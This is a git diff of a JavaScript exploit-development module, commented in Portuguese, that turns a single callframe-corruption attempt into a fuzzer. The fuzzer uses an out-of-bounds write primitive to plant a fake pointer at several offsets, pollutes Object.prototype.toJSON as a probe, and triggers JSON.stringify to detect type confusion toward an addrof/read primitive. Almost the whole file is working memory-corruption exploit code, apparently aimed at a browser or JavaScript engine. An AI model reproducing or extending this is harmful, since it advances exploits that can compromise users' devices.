@@ -1,4 +1,4 @@
-// js/script3/testMemoryLeakViaJsonTC.mjs (ETAPA DE DEPURAÇÃO: REMOVIDO TRY/CATCH)
+// js/script3/testMemoryLeakViaJsonTC.mjs (ESTRATÉGIA: FUZZER DE TYPE CONFUSION)
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { toHex, AdvancedInt64 } from '../utils.mjs';
 import {
@@ -7,18 +7,24 @@ import {
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 
-const CF_CORRUPT_CONFIG = {
-    CRASH_OFFSET: 0x70,
-    FAKE_POINTER_TO_OBJECT: new AdvancedInt64("0x0108230700001337"),
+// --- Configuração do Fuzzer ---
+const FUZZER_CONFIG = {
+    // Lista de offsets para testar a corrupção.
+    corruption_offsets: [0x70, 0x78, 0x80, 0x88, 0x90, 0x98, 0xA0, 0xA8, 0xB0],
+    
+    // Ponteiro falso que sabemos que não causa crash.
+    FAKE_POINTER: new AdvancedInt64("0x0108230700001337"),
 };
+// --- Fim dos Parâmetros ---
 
-let leaked_address = null;
+let success_offset = -1;
+
 function build_stack_and_trigger(depth, victim_obj) {
     if (depth <= 0) {
         try {
             JSON.stringify(victim_obj);
         } catch(e) {
-            logS3(`ERRO DENTRO DA PILHA DE CHAMADAS: ${e.message}`, "warn", "build_stack_and_trigger");
+            // Ignoramos erros aqui, pois a detecção será feita no 'toJSON'.
         }
         return;
     }
@@ -26,36 +32,70 @@ function build_stack_and_trigger(depth, victim_obj) {
 }
 
 export async function testAddrofPrimitive() {
-    const FNAME = "testAddrofPrimitive";
-    logS3(`--- Iniciando Tentativa de Leak via Corrupção de CallFrame ---`, "test", FNAME);
-    logS3(`   Usando ponteiro falso: ${CF_CORRUPT_CONFIG.FAKE_POINTER_TO_OBJECT.toString()}`, "info", FNAME);
+    const FNAME = "testTypeConfusionFuzzer";
+    logS3(`--- Iniciando Fuzzer de Type Confusion com Sonda Diagnóstica ---`, "test", FNAME);
 
-    await triggerOOB_primitive();
+    // Itera sobre cada offset candidato
+    for (const offset of FUZZER_CONFIG.corruption_offsets) {
+        if (success_offset !== -1) break;
 
-    const victim = {};
-    const ppKey = 'toJSON';
+        logS3(`\n>>> Testando Offset: ${toHex(offset)}`, "info", FNAME);
+        await triggerOOB_primitive();
 
-    Object.defineProperty(Object.prototype, ppKey, {
-        value: function() {
-            logS3(`[${ppKey} Poluído] Chamado! 'this' é do tipo: ${Object.prototype.toString.call(this)}`, "info", FNAME);
-            return { executed: true };
-        },
-        writable: true, configurable: true, enumerable: false
-    });
+        const victim = { test_id: offset };
+        const ppKey = 'toJSON';
+        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
 
-    logS3(`Corrompendo offset ${toHex(CF_CORRUPT_CONFIG.CRASH_OFFSET)} com ponteiro falso...`, "warn", FNAME);
+        // Etapa 1: Poluir toJSON com nossa nova e poderosa sonda de diagnóstico.
+        Object.defineProperty(Object.prototype, ppKey, {
+            value: function() {
+                const this_type = Object.prototype.toString.call(this);
+                // Se 'this' não for o nosso objeto 'victim' original, encontramos uma confusão!
+                if (!this.hasOwnProperty('test_id')) {
+                    logS3(`[SONDA] TYPE CONFUSION DETECTADA no offset ${toHex(offset)}!`, "vuln", FNAME);
+                    logS3(`  -> 'this' é do tipo: ${this_type}`, "leak", FNAME);
+                    
+                    // Tenta acessar propriedades de diferentes tipos de objeto
+                    try { logS3(`  -> Tentando ler 'this.byteLength': ${this.byteLength}`, "leak", FNAME); } catch (e) {}
+                    try { logS3(`  -> Tentando ler 'this.length': ${this.length}`, "leak", FNAME); } catch (e) {}
+                    try { logS3(`  -> Tentando ler 'this.callee': ${this.callee}`, "leak", FNAME); } catch (e) {}
+                    
+                    success_offset = offset;
+                }
+                return this; // Retorna o próprio objeto para evitar mais processamento
+            },
+            writable: true, configurable: true, enumerable: false
+        });
+
+        // Etapa 2: Realizar a corrupção no offset atual
+        try {
+            oob_write_absolute(offset, FUZZER_CONFIG.FAKE_POINTER, 8);
+        } catch (e) {
+            logS3(`Falha ao escrever OOB no offset ${toHex(offset)}: ${e.message}`, "error", FNAME);
+            continue; // Pula para o próximo offset
+        }
+        
+        await PAUSE_S3(50);
+
+        // Etapa 3: Construir a pilha e acionar o gatilho
+        build_stack_and_trigger(20, victim);
+
+        // Limpeza para a próxima iteração do loop
+        if (originalToJSONDescriptor) {
+            Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
+        } else {
+            delete Object.prototype[ppKey];
+        }
+        clearOOBEnvironment();
+        await PAUSE_S3(50);
+    }
     
-    // DEBUG: Bloco try/catch removido para expor o erro real.
-    // Esperamos um erro diferente de "SyntaxError" agora.
-    oob_write_absolute(CF_CORRUPT_CONFIG.CRASH_OFFSET, CF_CORRUPT_CONFIG.FAKE_POINTER_TO_OBJECT, 8);
-    
-    await PAUSE_S3(100);
-
-    logS3("Construindo pilha de chamadas e acionando JSON.stringify...", "info", FNAME);
-    build_stack_and_trigger(20, victim);
-
-    delete Object.prototype[ppKey];
-    clearOOBEnvironment();
-    
-    logS3("--- Teste de depuração concluído. ---", "info", FNAME);
+    // Relatório Final
+    if (success_offset !== -1) {
+        logS3(`--- SUCESSO! Vulnerabilidade de Type Confusion confirmada no offset: ${toHex(success_offset)} ---`, "vuln", FNAME);
+        logS3("   O próximo passo é analisar as propriedades vazadas nesse offset para construir a primitiva de leitura.", "info", FNAME);
+    } else {
+        logS3("--- Fuzzer concluído. Nenhum offset causou uma confusão de tipos óbvia. ---", "warn", FNAME);
+        logS3("   Pode ser necessário expandir a lista de offsets ou analisar o disassembly para encontrar alvos melhores.", "info", FNAME);
+    }
 }
